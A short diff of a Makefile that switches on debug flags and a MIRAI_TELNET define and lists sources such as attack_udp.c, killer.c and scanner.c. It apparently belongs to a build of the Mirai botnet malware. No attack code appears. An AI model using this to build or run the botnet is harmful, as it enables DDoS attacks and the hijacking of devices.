@@ -1,6 +1,17 @@
-# Compiler and flags
+# Default values
 CC = gcc
-CFLAGS = -Wall -O2
+CFLAGS = -Wall -Wextra
+#DEBUG = 1  # Default to no debugging
+CFLAGS += -g -DDEBUG  -DMIRAI_TELNET
+
+# Enable debugging flags
+
+# # Conditional flags for debugging
+# ifeq ($(DEBUG), 1)
+# else
+#     CFLAGS += -O2  # Optimization for non-debug builds
+# endif
+
 
 # Source files and output binary
 SRC = attack.c attack_app.c attack_gre.c attack_tcp.c attack_udp.c checksum.c killer.c main.c rand.c resolv.c scanner.c table.c util.c
